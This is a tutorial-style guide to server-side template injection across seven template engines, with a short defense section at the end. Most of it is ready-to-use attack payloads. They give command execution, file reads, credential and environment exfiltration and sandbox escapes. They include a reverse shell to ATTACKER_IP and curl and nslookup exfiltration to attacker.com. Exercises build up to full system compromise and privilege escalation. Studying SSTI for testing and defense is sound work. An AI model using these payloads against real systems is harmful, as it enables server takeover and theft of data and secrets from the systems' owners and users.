# Server-Side Template Injection (SSTI) Attack Guide

## Introduction and Objectives

Server-Side Template Injection (SSTI) occurs when user input is embedded directly into a server-side template engine and processed as part of a template expression rather than treated as plain data. Template engines such as Jinja2, Twig, Freemarker, Mako, ERB, Velocity, and Thymeleaf are designed to separate presentation logic from business logic by merging dynamic data into static templates. When an attacker can inject template syntax, they can escape the intended data context and execute arbitrary expressions on the server.

SSTI is a critical vulnerability because modern template engines expose powerful APIs to the template context. Through these APIs, an attacker can access file system operations, execute operating system commands, exfiltrate environment variables, and achieve full remote code execution (RCE). The severity of SSTI is often underestimated because template injection may appear limited to simple variable output, but the introspection capabilities of most template engines provide a path to code execution.

**Learning Objectives:**

- Identify and fingerprint different template engines through injection probing
- Exploit SSTI in Jinja2 (Python/Flask), Twig (PHP/Symfony), Freemarker (Java), Mako (Python), ERB (Ruby), Velocity (Java), and Thymeleaf (Spring)
- Construct polyglot payloads that work across multiple template engines
- Perform sandbox escapes in restricted template environments
- Build RCE chains from template expression evaluation
- Execute blind SSTI attacks with out-of-band (OOB) data exfiltration
- Recommend and implement robust SSTI defenses

**Prerequisites:**

- Proficiency in Python, PHP, Java, and Ruby syntax
- Understanding of template engine architecture and rendering pipelines
- Familiarity with Burp Suite or similar web proxy tools
- Access to vulnerable practice applications (recommended)

## SSTI Detection and Fingerprinting

### Detection Methodology

The first step in SSTI testing is identifying injectable parameters. Template engines evaluate mathematical expressions and string operations, so send probe payloads and compare responses:

**Phase 1: Mathematical expression probing**

Send these payloads and check whether the response contains the computed result:

| Payload | Expected Result | Engine Hint |
|---------|----------------|-------------|
| `{{7*7}}` | `49` | Jinja2, Twig, ERB (with `<%= %>`), Freemarker |
| `${7*7}` | `49` | Freemarker, Velocity, Mako, EL expressions |
| `#{7*7}` | `49` | Thymeleaf, Ruby ERB (interpolation), Pebble |
| `{{7*'7'}}` | `7777777` | Jinja2 (string multiplication) |
| `{{7*'7'}}` | `49` | Twig (numeric comparison) |
| `*{7*7}` | `49` | Thymeleaf |
| `<%= 7*7 %>` | `49` | ERB (Ruby), EJS |
| `#{ 7*7 }` | `49` | Thymeleaf, Ruby string interpolation |

**Phase 2: String expression probing**

| Payload | Expected Result | Engine |
|---------|----------------|--------|
| `{{'test'}}` | `test` | Jinja2, Twig |
| `${"test"}` | `test` | Freemarker, Velocity |
| `<%="test"%>` | `test` | ERB |
| `#{'test'}` | `test` | Thymeleaf |

**Phase 3: Error-based identification**

Trigger intentional errors to reveal the template engine in error messages:

```
{{undefined_variable}}
<%= undefined_variable %>
${undefined_variable}
```

Error messages often include the engine name (e.g., "Jinja2 UndefinedError", "Twig Error", "Freemarker template error").

### Decision Tree for Engine Fingerprinting

```
Input {{7*7}}
  -> Output is 49
    -> Input {{7*'7'}}
      -> Output is 7777777 → Jinja2 (Python)
      -> Output is 49 → Twig (PHP)
      -> Output is 0 → Thymeleaf (Java)
  -> Output is {{7*7}} (not rendered)
    -> Input ${7*7}
      -> Output is 49 → Freemarker, Velocity (Java) or Mako (Python)
        -> Input #{7*7}
          -> Output is 49 → Freemarker
          -> Not rendered → Check ${7*7} vs $7*7
    -> Input <%= 7*7 %>
      -> Output is 49 → ERB (Ruby) or EJS (Node.js)
    -> Input #{7*7}
      -> Output is 49 → Thymeleaf (Java) or Pebble
```

## Jinja2 (Flask) Exploitation

### Basic Exploration

Jinja2 is the default template engine for Flask and is one of the most commonly encountered engines in SSTI research. It provides powerful introspection capabilities through the MRO (Method Resolution Order) chain.

**Access the MRO chain:**

```jinja2
{{ ''.__class__.__mro__ }}
```

This returns the class hierarchy: `['str', 'object']`

**Access built-in classes:**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

This enumerates all subclasses of `object`, which includes file handles, network sockets, and OS command execution classes.

### Remote Code Execution

**Method 1: Using subprocess.Popen**

Find the index of `subprocess.Popen` in the subclasses list:

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Search the output for `subprocess.Popen` and note its index (varies by Python version). Then execute commands:

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}
```

Replace `INDEX` with the actual index of `subprocess.Popen`.

**Method 2: Using os.popen (via builtins)**

```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Method 3: Using the `config` or `request` objects**

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Method 4: Using `lipsum` or `cycler` globals**

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

**Method 5: File read without command execution**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('/etc/passwd','r').read() }}
```

Where `INDEX` is the position of `_io.FileIO` or similar file class.

### Environment Variable Exfiltration

```jinja2
{{ config.__class__.__init__.__globals__['os'].environ }}
```

Or through the application object:

```jinja2
{{ request.application.__globals__ }}
```

This often reveals secret keys, database credentials, and API keys stored in environment variables.

### Common Jinja2 Payloads

```jinja2
# Execute 'id' command
{{ namespace.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Reverse shell (URL-encoded)
{{ namespace.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}

# Read file
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('/etc/passwd','r').read() }}

# Write file
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('/tmp/pwned','w').write('hello') }}
```

## Twig (Symfony) Exploitation

### Basic Exploration

Twig is the default template engine for the Symfony PHP framework. It has a sandbox mode, but many deployments do not enable it.

**Self-reference and introspection:**

```twig
{{ _self }}
{{ _context }}
```

### PHP Code Execution

**Method 1: Using _self registerUndefinedFilterCallback**

Twig versions before 1.x and 2.x allow registering callback functions:

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

**Method 2: Using Twig extensions**

```twig
{{ ['id']|filter('system') }}
```

The `filter` function with `system` as the callback executes the command.

**Method 3: Using the `map` filter (Twig 3.x)**

```twig
{{ ['id']|map('system')|join }}
```

**Method 4: Using `sort` with a callback**

```twig
{{ ['id','']|sort('system') }}
```

**Method 5: Using `reduce`**

```twig
{{ ['id']|reduce('system','') }}
```

### File Read

```twig
{{ include('/etc/passwd') }}
```

Or using PHP functions if accessible:

```twig
{{ file_get_contents('/etc/passwd') }}
```

### Environment Variable Access

```twig
{{ app.request.server.all }}
{{ getenv('APP_SECRET') }}
```

## Freemarker (Java) Exploitation

### Basic Exploration

Freemarker is widely used in Java enterprise applications. It provides `<#assign>` directives and access to Java object methods.

**Execute commands via `freemarker.template.utility.Execute`:**

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**Execute via `ObjectConstructor`:**

```freemarker
<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
${ oc("java.lang.ProcessBuilder","id").start() }
```

**Read files:**

```freemarker
<#assign is=object?new("java.io.FileInputStream","/etc/passwd")>
<#assign br=object?new("java.io.BufferedReader",object?new("java.io.InputStreamReader",is))>
${br.readLine()}
```

### Sandbox Bypass

When the `new` built-in is disabled, use alternative approaches:

```freemarker
<#function codeexec cmd>
  <#local rt=Class.forName("java.lang.Runtime")>
  <#local exec=rt.getMethod("getRuntime")>
  <#local proc=rt.getMethod("exec",Class.forName("[Ljava.lang.String;"))>
  <#local result=proc.invoke(exec.invoke(null),cmd?split(" "))>
  <#return result>
</#function>
${codeexec("id")}
```

Or use the `?api` built-in (available in Freemarker 2.3.17+):

```freemarker
<#assign value="freemarker.template.utility.Execute"?new()>
${value("id")}
```

## Mako (Python) Exploitation

Mako is a Python template engine used in web frameworks like Pyramid and by tools like Pelican.

### Basic Exploration

Mako uses `${}` for expression evaluation and `<% %>` for Python code blocks:

```mako
${7*7}
${self}
${self.__init__.__globals__}
```

### Code Execution

**Method 1: Using Python code blocks**

```mako
<%
import os
x = os.popen('id').read()
%>
${x}
```

**Method 2: Using expression evaluation**

```mako
${__import__('os').popen('id').read()}
```

**Method 3: Through the context object**

```mako
${self.module.__builtins__.__import__('os').popen('id').read()}
```

### File Read

```mako
${open('/etc/passwd').read()}
```

Or:

```mako
<%
with open('/etc/passwd') as f:
    content = f.read()
%>
${content}
```

## ERB (Ruby) Exploitation

ERB (Embedded Ruby) is Ruby's built-in template engine, commonly used in Ruby on Rails applications.

### Basic Exploration

```erb
<%= 7*7 %>
<%= self %>
<%= self.class %>
```

### Code Execution

**Method 1: Using system commands**

```erb
<%= system('id') %>
<%= `id` %>
<%= exec('id') %>
```

**Method 2: Using IO popen**

```erb
<%= IO.popen('id').readlines() %>
```

**Method 3: Using Open3**

```erb
<%= require 'open3' %><%= Open3.capture2('id') %>
```

### File Read

```erb
<%= File.read('/etc/passwd') %>
<%= open('/etc/passwd').read %>
```

### Rails-Specific Exploitation

```erb
<%= Rails.root %>
<%= Rails.env %>
<%= Rails.application.credentials %>
<%= ActiveRecord::Base.connection.execute("SELECT * FROM users") %>
```

## Velocity (Java) Exploitation

Velocity is a Java template engine used in Apache projects, Confluence, and many enterprise applications.

### Basic Exploration

```velocity
$velocityVersion
$velocityRuntime
$tool.getClass()
```

### Code Execution

**Method 1: Using Class.forName and Runtime**

```velocity
#set($rt=$Class.forName("java.lang.Runtime"))
#set($chr=$Class.forName("java.lang.Character"))
#set($ex=$rt.getRuntime().exec("id"))
$ex.waitFor()
#set($is=$ex.getInputStream())
#set($br=$Class.forName("java.io.BufferedReader").getConstructor($Class.forName("java.io.InputStreamReader")).newInstance($Class.forName("java.io.InputStreamReader").getConstructor($Class.forName("java.io.InputStream")).newInstance($is)))
#set($line=$br.readLine())
$line
```

**Method 2: Using Spring-specific utilities (if Spring is available)**

```velocity
#set($sb=$Class.forName("org.springframework.util.StringUtils"))
```

### File Read

```velocity
#set($f=$Class.forName("java.io.File").getConstructor($Class.forName("java.lang.String")).newInstance("/etc/passwd"))
#set($sc=$Class.forName("java.util.Scanner").getConstructor($Class.forName("java.io.File")).newInstance($f))
$sc.useDelimiter("\\A").next()
```

## Thymeleaf (Spring) Exploitation

Thymeleaf is the default template engine for Spring Boot applications.

### Basic Exploration

Thymeleaf uses `[[...]]` for inline expressions and `th:text` attributes:

```html
[[${7*7}]]
<p th:text="${7*7}"></p>
```

### Preprocessor Exploitation

Thymeleaf's preprocessor evaluates `__...__` expressions before the template is rendered. This allows expression injection in contexts where normal expression syntax is not possible:

```html
[[${__${T(java.lang.Runtime).getRuntime().exec('id')}__}]]
```

### SpEL (Spring Expression Language) Injection

Thymeleaf expressions support Spring Expression Language, enabling direct Java class access:

```html
[[${T(java.lang.Runtime).getRuntime().exec('id')}]]
```

**File read via SpEL:**

```html
[[${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))}]]
```

**More complex RCE with output:**

```html
[[${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}]]
```

### URL Path Injection

Some Thymeleaf configurations use the URL path as a template name (e.g., `return "user/" + userId`). If the path is user-controlled, an attacker can inject template expressions:

```
GET /user/__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x HTTP/1.1
```

The `::.x` suffix is a fragment expression that Thymeleaf processes.

## Polyglot Payloads

Polyglot SSTI payloads work across multiple template engines. These are useful during initial testing when the engine is unknown:

### Detection Polyglot

```
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
#{ 7*7 }
${7*7}
```

### Comprehensive RCE Polyglot

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}${T(java.lang.Runtime).getRuntime().exec('id')}<%= `id` %>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Polyglot for Unknown Engines

```
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
<%= File.read('/etc/passwd') %>
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

## Sandbox Escape Techniques

### Jinja2 Sandbox Escape

The Jinja2 sandbox (`jinja2.sandbox.SandboxedEnvironment`) restricts attribute access and function calls. Known bypasses include:

**Using `attr` filter:**

```jinja2
{{ "".__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```

**Using `|attr` to bypass dot notation restrictions:**

```jinja2
{{ ""|attr("__class__")|attr("__mro__") }}
```

**Using `request` object attributes:**

```jinja2
{{ request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("id")|attr("read")() }}
```

### Freemarker Sandbox Bypass

When the `new` built-in is restricted:

```freemarker
<#attempt>
  <#assign notimportant=object?api.getClass().forName("java.lang.Runtime")?api.getMethod("getRuntime")?api.invoke(null)?api.exec("id")>
<#recover>
  Error
</#attempt>
```

## Blind SSTI with OOB Exfiltration

When the template injection does not produce visible output (blind SSTI), use out-of-band techniques to exfiltrate data.

### Time-Based Blind Detection

Use time delays to confirm SSTI:

```
Jinja2:  {{ config.__class__.__init__.__globals__['os'].popen('sleep 10').read() }}
Twig:    {{ _self.env.registerUndefinedFilterCallback("sleep") }}{{ _self.env.getFilter("10") }}
ERB:     <%= sleep(10) %>
Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("sleep 10") }
```

### DNS Exfiltration

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('nslookup $(whoami).attacker.com').read() }}
```

```erb
<%= `nslookup $(whoami).attacker.com` %>
```

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("nslookup $(whoami).attacker.com") }
```

### HTTP Exfiltration

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('curl https://attacker.com/exfil?data=$(cat /etc/passwd | base64)').read() }}
```

```erb
<%= `curl https://attacker.com/exfil?data=$(whoami)` %>
```

### ICMP Exfiltration

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('ping -c 1 $(whoami).attacker.com').read() }}
```

## Hands-On Practice and Exercises

### Exercise 1: Engine Fingerprinting

**Objective**: Identify the template engine used by a vulnerable application.

**Setup**: Deploy a vulnerable Flask, Symfony, or Spring Boot application with SSTI.

**Steps**:
1. Send mathematical probes: `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`
2. Send string probes: `{{7*'7'}}`, `${"test"}`
3. Analyze the response to determine which engine is in use
4. Confirm by sending engine-specific payloads
5. Document the fingerprinting methodology and results

**Expected Result**: Correct identification of the template engine and version.

### Exercise 2: Jinja2 RCE Chain

**Objective**: Achieve remote code execution through a Jinja2 SSTI vulnerability.

**Setup**: Use a deliberately vulnerable Flask application.

**Steps**:
1. Confirm Jinja2 with `{{7*'7'}}` (expect `7777777`)
2. Enumerate subclasses: `{{ ''.__class__.__mro__[1].__subclasses__() }}`
3. Find the index of `subprocess.Popen` or `os._wrap_close`
4. Execute `id` and capture the output
5. Read `/etc/passwd`
6. Exfiltrate environment variables
7. Establish a reverse shell

**Expected Result**: Full remote code execution on the target server.

### Exercise 3: Multi-Engine SSTI Assessment

**Objective**: Exploit SSTI across three different template engines.

**Setup**: Prepare three vulnerable applications (Flask/Jinja2, Symfony/Twig, Spring/Thymeleaf).

**Steps**:
1. Fingerprint each application's template engine
2. Craft engine-specific RCE payloads
3. Achieve command execution on each target
4. Compare the difficulty and techniques required for each engine
5. Document which engines have the most dangerous default configurations

**Expected Result**: Successful exploitation of SSTI in three different template engines with comparative analysis.

### Exercise 4: Blind SSTI with OOB

**Objective**: Exploit a blind SSTI vulnerability using out-of-band exfiltration.

**Setup**: Configure a vulnerable application where template output is not reflected in the response.

**Steps**:
1. Confirm SSTI with time-based payloads (sleep 10)
2. Set up a listener (netcat or Burp Collaborator)
3. Craft DNS exfiltration payloads for the identified engine
4. Exfiltrate the hostname and current user
5. Exfiltrate the contents of `/etc/passwd` via HTTP POST
6. Automate the exfiltration with a script

**Expected Result**: Successful data exfiltration through blind SSTI using multiple OOB channels.

### Exercise 5: SSTI to Full System Compromise

**Objective**: Chain SSTI with other vulnerabilities to achieve full system compromise.

**Setup**: Use a multi-vulnerability practice environment.

**Steps**:
1. Identify SSTI in a template parameter
2. Achieve RCE through template injection
3. Enumerate the system: users, network, running services
4. Find and read application configuration files for database credentials
5. Pivot to the database using extracted credentials
6. Escalate privileges if possible (SUID binaries, misconfigurations)
7. Document the full attack chain

**Expected Result**: Complete attack chain from SSTI to full system compromise with documentation.

## Defense Mechanisms

### Input Validation

Never pass user input directly into template expressions. Use a data-only approach where user input is passed as a variable to the template context:

```python
# WRONG - vulnerable to SSTI
template = Template("Hello " + user_input)
result = template.render()

# CORRECT - user input is data, not template syntax
template = Template("Hello {{ name }}")
result = template.render(name=user_input)
```

### Sandbox Mode

Enable the template engine's sandbox mode when available:

```python
# Jinja2 sandbox
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
template = env.from_string("Hello {{ name }}")
```

Note that sandbox modes are not foolproof and have historically been bypassed. Do not rely on sandboxing as the sole defense.

### Allowlist Approach

Restrict the template context to only the variables and functions that the template actually needs:

```python
# Only expose necessary variables
template_context = {
    'user_name': user.name,
    'user_email': user.email,
    'posts': user.posts
}
# Do NOT expose: request, config, self, __builtins__, etc.
```

### Content Security Policy

While CSP does not prevent SSTI directly, it can limit the impact by restricting what an attacker can do after achieving RCE (e.g., preventing outbound connections to attacker-controlled domains).

### Regular Security Audits

Use automated tools to scan for SSTI vulnerabilities:

- **tplmap**: Automated SSTI detection and exploitation (https://github.com/epinna/tplmap)
- **Burp Suite Scanner**: Detects template injection patterns
- **OWASP ZAP**: Passive scanning for template syntax in parameters

## References and Resources

### Standards and Documentation

- **OWASP Testing Guide - Testing for SSTI**: https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Research - Server-Side Template Injection**: https://portswigger.net/research
- **Jinja2 Documentation**: https://jinja.palletsprojects.com/
- **Twig Documentation**: https://twig.symfony.com/
- **Freemarker Documentation**: https://freemarker.apache.org/
- **Thymeleaf Documentation**: https://www.thymeleaf.org/

### Tools

- **tplmap**: Automated SSTI detection and exploitation tool (https://github.com/epinna/tplmap)
- **Burp Suite Professional**: Template injection scanning (https://portswigger.net/burp)
- **SSTImap**: SSTI detection and exploitation (https://github.com/vladko312/SSTImap)
- **Template Injection Table**: Comprehensive payload reference (https://github.com/swisskyrepo/PayloadsAllTheThings)

### Practice Labs

- **PortSwigger Web Security Academy - SSTI**: https://portswigger.net/web-security/server-side-template-injection
- **TryHackMe - SSTI Rooms**: https://tryhackme.com/
- **HackTheBox - Template Injection Challenges**: Various SSTI-focused machines
- **DVWA with custom SSTI module**: Extended vulnerable application

### Research Papers and Presentations

- **"Server-Side Template Injection" by James Kettle (PortSwigger)**: Foundational SSTI research presentation at Black Hat
- **"Template Injection: The Hidden Threat"**: DEF CON presentation on advanced SSTI techniques
- **PayloadsAllTheThings - SSTI**: https://github.com/swisskyrepo/PayloadsAllTheThings#server-side-template-injection
- **HackTricks - SSTI**: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

### Additional Reading

- **Jinja2 Sandbox Bypass History**: Historical analysis of sandbox escapes
- **Thymeleaf SpEL Injection Research**: Spring-specific exploitation techniques
- **Ruby ERB Security Considerations**: Rails template security guide
- **HackerOne Hacktivity**: Search for SSTI-related disclosed reports for real-world examples
